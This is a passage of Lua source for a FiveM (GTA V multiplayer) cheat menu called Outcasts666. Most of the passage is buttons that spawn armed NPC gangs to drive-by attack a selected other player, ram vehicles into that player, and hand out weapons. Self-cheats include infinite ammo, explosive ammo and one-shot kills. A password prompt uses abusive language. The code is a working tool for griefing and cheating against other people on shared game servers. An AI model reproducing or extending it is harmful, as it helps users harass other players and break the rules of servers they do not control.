                                    TaskShootAtEntity(
                                        ped1,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        200,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    makePedHostile(ped, SelectedPlayer, 0, 0)
                                    makePedHostile(ped1, SelectedPlayer, 0, 0)
                                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                                    TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                                    for i = 1, 2 do
                                        Citizen.Wait(5)
                                    ClearPedTasks(GetPlayerPed(-1))
                                    end
                                end
                            end
                        end
                    end
                end
				elseif Outcasts666.Button('~h~Spawn Marines in car ~r~Attack') then
                    local vehlist = {"Mesa3", "BARRAGE", "khanjali"}
                    local veh = vehlist[math.random(#vehlist)]
                    for i = 0, 1 do
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('S_M_Y_Marine_03')
                    while not HasModelLoaded(veh) and not HasModelLoaded('S_M_Y_Marine_03') do
                        RequestModel('S_M_Y_Marine_03')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 30),
                            pos.y - (yf * 30),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                            true,
                            false
                        )
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('S_M_Y_Marine_03')
                            Citizen.Wait(50)
                            if HasModelLoaded('S_M_Y_Marine_03') then
                                Citizen.Wait(50)
                                local ped = CreatePed(21, GetHashKey('S_M_Y_Marine_03'), pos.x, pos.y, pos.z, true, true)
                                local ped1 =
                                    CreatePed(26, GetHashKey('S_M_Y_Marine_03'), pos.x, pos.y, pos.z, true, true)
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_MICROSMG'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_MACHINEPISTOL'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v, 0)
                                    TaskDriveBy(
                                        ped,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        pos.x,
                                        pos.y,
                                        pos.z,
                                        200,
                                        99,
                                        0,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    TaskShootAtEntity(
                                        ped1,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        200,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    makePedHostile(ped, SelectedPlayer, 0, 0)
                                    makePedHostile(ped1, SelectedPlayer, 0, 0)
                                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                                    TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                                    for i = 1, 2 do
                                        Citizen.Wait(5)
                                    ClearPedTasks(GetPlayerPed(-1))
                                    end
                                end
                            end
                        end
                    end
                end
				elseif Outcasts666.Button('~h~Spawn Italian Mafia in car ~r~Attack') then
                    local vehlist = {"Italigtb2", "Italigtb", "Prototipo", "Osiris", "T20", "Turismo2", "Zentorno", "Nero2", "Cheetah"}
                    local veh = vehlist[math.random(#vehlist)]
                    for i = 0, 1 do
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('CS_MovPremMale')
                    while not HasModelLoaded(veh) and not HasModelLoaded('CS_MovPremMale') do
                        RequestModel('CS_MovPremMale')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 30),
                            pos.y - (yf * 30),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                            true,
                            false
                        )
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('CS_MovPremMale')
                            Citizen.Wait(50)
                            if HasModelLoaded('CS_MovPremMale') then
                                Citizen.Wait(50)
                                local ped = CreatePed(21, GetHashKey('CS_MovPremMale'), pos.x, pos.y, pos.z, true, true)
                                local ped1 =
                                    CreatePed(21, GetHashKey('CS_MovPremMale'), pos.x, pos.y, pos.z, true, true)
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_REVOLVER'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_COMPACTRIFLE'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v, 0)
                                    TaskDriveBy(
                                        ped,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        pos.x,
                                        pos.y,
                                        pos.z,
                                        200,
                                        99,
                                        0,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    TaskShootAtEntity(
                                        ped1,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        200,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    makePedHostile(ped, SelectedPlayer, 0, 0)
                                    makePedHostile(ped1, SelectedPlayer, 0, 0)
                                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                                    TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                                    for i = 1, 2 do
                                        Citizen.Wait(5)
                                    ClearPedTasks(GetPlayerPed(-1))
                                    end
                                end
                            end
                        end
                    end
                end
				elseif Outcasts666.Button('~h~Spawn The Lost MC Club ~r~Attack') then
                    local vehlist = {"Vindicator", "Ruffian", "Sanchez2", "Hexer", "Gargoyle", "Enduro", "Double", "Bati", "GBurrito", "GBurrito2"}
                    local veh = vehlist[math.random(#vehlist)]
                    for i = 0, 1 do
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('G_M_Y_Lost_03')
                    while not HasModelLoaded(veh) and not HasModelLoaded('G_M_Y_Lost_03') do
                        RequestModel('G_M_Y_Lost_03')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 30),
                            pos.y - (yf * 30),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                            true,
                            false
                        )
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('G_M_Y_Lost_03')
                            Citizen.Wait(50)
                            if HasModelLoaded('G_M_Y_Lost_03') then
                                Citizen.Wait(50)
                                local ped = CreatePed(21, GetHashKey('G_M_Y_Lost_03'), pos.x, pos.y, pos.z, true, true)
                                local ped1 =
                                    CreatePed(21, GetHashKey('G_M_Y_Lost_03'), pos.x, pos.y, pos.z, true, true)
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_MACHINEPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_REVOLVER'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v, 0)
                                    TaskDriveBy(
                                        ped,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        pos.x,
                                        pos.y,
                                        pos.z,
                                        200,
                                        99,
                                        0,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    TaskShootAtEntity(
                                        ped1,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        200,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    makePedHostile(ped, SelectedPlayer, 0, 0)
                                    makePedHostile(ped1, SelectedPlayer, 0, 0)
                                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                                    TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                                    for i = 1, 2 do
                                        Citizen.Wait(5)
                                    ClearPedTasks(GetPlayerPed(-1))
                                    end
                                end
                            end
                        end
                    end
                end
				elseif Outcasts666.Button('~h~Spawn Terrorists In Cars ~r~Attack') then
                    local vehlist = {"Technical3", "Technical2", "Technical", "Dune3", "Tampa3"}
                    local veh = vehlist[math.random(#vehlist)]
                    for i = 0, 1 do
                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                        NetworkRequestControlOfEntity(vt)
                        SetVehicleModKit(vt, 0)
                        ToggleVehicleMod(vt, 20, 1)
                        SetVehicleModKit(vt, 0)
                        SetVehicleTyresCanBurst(vt, 1)
                    end
                    local v = nil
                    RequestModel(veh)
                    RequestModel('G_M_M_ChiCold_01')
                    while not HasModelLoaded(veh) and not HasModelLoaded('G_M_M_ChiCold_01') do
                        RequestModel('G_M_M_ChiCold_01')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                            veh,
                            pos.x - (xf * 30),
                            pos.y - (yf * 30),
                            pos.z + 1,
                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
                            true,
                            false
                        )
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                            RequestModel('G_M_M_ChiCold_01')
                            Citizen.Wait(50)
                            if HasModelLoaded('G_M_M_ChiCold_01') then
                                Citizen.Wait(50)
                                local ped = CreatePed(21, GetHashKey('G_M_M_ChiCold_01'), pos.x, pos.y, pos.z, true, true)
                                local ped1 =
                                    CreatePed(21, GetHashKey('G_M_M_ChiCold_01'), pos.x, pos.y, pos.z, true, true)
                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                                    GiveWeaponToPed(ped, GetHashKey('WEAPON_MACHINEPISTOL'), 9999, 1, 1)
                                    GiveWeaponToPed(ped1, GetHashKey('WEAPON_MICROSMG'), 9999, 1, 1)
                                    SetPedIntoVehicle(ped, v, -1)
                                    SetPedIntoVehicle(ped1, v, 0)
                                    TaskDriveBy(
                                        ped,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        pos.x,
                                        pos.y,
                                        pos.z,
                                        200,
                                        99,
                                        0,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    TaskShootAtEntity(
                                        ped1,
                                        GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)),
                                        200,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    makePedHostile(ped, SelectedPlayer, 0, 0)
                                    makePedHostile(ped1, SelectedPlayer, 0, 0)
                                    TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                                    TaskCombatPed(ped1, GetPlayerPed(SelectedPlayer), 0, 16)
                                    for i = 1, 2 do
                                        Citizen.Wait(5)
                                    ClearPedTasks(GetPlayerPed(-1))
                                    end
                                end
                            end
                        end
                    end
                end
            end 
    
                        Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("VehicleRamMenu") then
                    if Outcasts666.Button("Futo") then
                        local model = GetHashKey("futo")
                        RequestModel(model)
                        while not HasModelLoaded(model) do
                            Citizen.Wait(0)
                        end
                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                        if HasModelLoaded(model) then
                            local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
                            SetVehicleForwardSpeed(veh, 120.0)		
                        end	
                    elseif Outcasts666.Button("Bus") then
                        local model = GetHashKey("bus")
                        RequestModel(model)
                        while not HasModelLoaded(model) do
                            Citizen.Wait(0)
                        end
                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                        if HasModelLoaded(model) then
                            local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
                            SetVehicleForwardSpeed(veh, 120.0)		
                        end		
                    end	
                    
    
                        Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("SingleWepPlayer") then
                    for i = 1, #allWeapons do
                        if Outcasts666.Button(allWeapons[i]) then
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
                        end
                    end
                    
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("WeaponMenu") then
                    if Outcasts666.MenuButton("∑Weapon List", "WeaponTypes") then
                    elseif Outcasts666.ComboBox("Weapon/Melee Damage", { "1x (Default)", "2x", "3x", "4x", "5x" }, currentDamage, selectedDamage, function(currentIndex, selectedIndex)
                        currentDamage = currentIndex
                        selectedDamage = selectedIndex
                    end) 
                    then
                    elseif Outcasts666.Button("Give All Weapons") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
                        end
                    elseif Outcasts666.Button("Drop Current Weapon") then
                        local ped = GetPlayerPed(-1) 
                        local weapon = GetSelectedPedWeapon(ped) 
                        SetPedDropsInventoryWeapon(ped, weapon, 0, 2.0, 0, -1) 
                    elseif Outcasts666.Button("Remove All Weapons") then
                        for i = 1, #allWeapons do
                            RemoveAllPedWeapons(PlayerPedId(), true)
                        end
                    elseif Outcasts666.Button("Give Ammo") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250)
                        end
                    elseif Outcasts666.CheckBox(
                        "No Reload",
                        InfClip,
                        function(enabled)
                            InfClip = enabled
                            SetPedInfiniteAmmoClip(PlayerPedId(), InfClip)
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Infinite Ammo",
                        InfAmmo,
                        function(enabled)
                            InfAmmo = enabled
                            SetPedInfiniteAmmo(PlayerPedId(), InfAmmo)
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Explosive Ammo",
                        explosiveAmmo,
                        function(enabled)
                            explosiveAmmo = enabled
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "oneshot", 
                        Oneshot,
                        function(enabled)
                            Oneshot = enabled
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Force Gun",
                        forceGun,
                        function(enabled)
                            forceGun = enabled
                        end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Delete Gun",
                        DeleteGun,
                        function(enabled)
                            DeleteGun = enabled
                        end)
                    then
                    elseif Outcasts666.MenuButton("∑Weapon Tints", "WeaponCustomization") then
                    elseif Outcasts666.MenuButton("∑Bullet Gun Options", "BulletGunMenu") then
                    end
                
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("WeaponCustomization") then
                    if Outcasts666.CheckBox(
                        "Rainbow Tint",
                        rainbowTint,
                        function(enabled)
                            rainbowTint = enabled
                        end)
                    then
                    elseif Outcasts666.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                        currentTint = currentIndex
                        selectedTint = selectedIndex
    
                        if selectedTint == 1 then
                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
                        end
                        if selectedTint == 2 then
                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
                        end
                        if selectedTint == 3 then
                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                        end
                        if selectedTint == 4 then
                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
                        end
                        if selectedTint == 5 then
                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
                        end
                        if selectedTint == 6 then
                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
                        end
                        if selectedTint == 7 then
                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
                        end
                        if selectedTint == 8 then
                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                        end
                    end)
                    then
                    elseif Outcasts666.Button("Add Special Finish") then
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                        GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                    elseif Outcasts666.Button("Remove Special Finish") then
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                        RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                    end					
    
                    Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("BulletGunMenu") then
                    if Outcasts666.CheckBox(
                        "Vehicle Gun",
                        vehicleGun,
                        function(enabled)
                            vehicleGun = enabled
                        end)
                    then
                    elseif Outcasts666.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                        currentVehicle = currentIndex
                        selectedVehicle = selectedIndex
    
                    end) 
                    then
                    elseif Outcasts666.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                        currentVehicleSpeed = currentIndex
                        selectedVehicleSpeed = selectedIndex
                    end) 
                    then
                    elseif Outcasts666.CheckBox(
                        "Ped Gun",
                        pedGun,
                        function(enabled)
                            pedGun = enabled
                    end)
                    then
                    elseif Outcasts666.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                        currentPed = currentIndex
                        selectedPed = selectedIndex
                    end)
                    then
                    elseif Outcasts666.CheckBox(
                        "Bullet Gun",
                        bulletGun,
                        function(enabled)
                            bulletGun = enabled
                        end)
                    then
                    elseif Outcasts666.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                        currentBullet = currentIndex
                        selectedBullet = selectedIndex
                        end)
                    then
                    end          
            
                    Outcasts666.Display()
                elseif IsDisabledControlPressed(0, 168) then --F7
                    if logged then
                        Outcasts666.OpenMenu("MainMenu")
                    else
                        local temp = KeyboardInput("Enter Pass Cunt", "", 100)
                        if temp == pass then
                            drawNotification("~g~So Your Not A Skid!")
                            logged = true
                            Outcasts666.OpenMenu("MainMenu")
                        else
                            drawNotification("~r~Fuck off lol!")
                        end
                    end
                end
    
                Citizen.Wait(0)
            end
        end)
 
